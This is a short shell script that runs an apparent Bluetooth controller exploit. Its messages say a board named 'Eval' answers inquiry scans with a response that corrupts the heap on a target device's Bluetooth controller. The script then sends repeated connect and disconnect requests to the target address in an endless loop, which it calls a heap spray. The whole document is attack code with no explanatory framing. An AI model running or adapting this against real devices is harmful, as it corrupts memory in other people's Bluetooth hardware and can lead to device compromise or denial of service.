if [ $# -lt 2 ]
then
    echo "usage: $0 hci0 <target address>"
    exit 1
fi

systemctl restart bluetooth.service
hciconfig $1 up
hciconfig $1 iscan

echo "Eval board is now visible and will respond with the EIR (Inquiry Scan)."
echo "Search now for BT devices on the target."
echo "If a device called 'Eval' appears the heap should be corrupted on the target controller."
echo "Then hit return to run heap-spray"
read
hciconfig $1 noscan

echo "Attacking $target"
while [ 1 -eq 1 ]
do
    echo "connect" $1
    hcitool -i $1 cc $2
    echo "disconnect" $1
    hcitool -i $1 dc $2
done

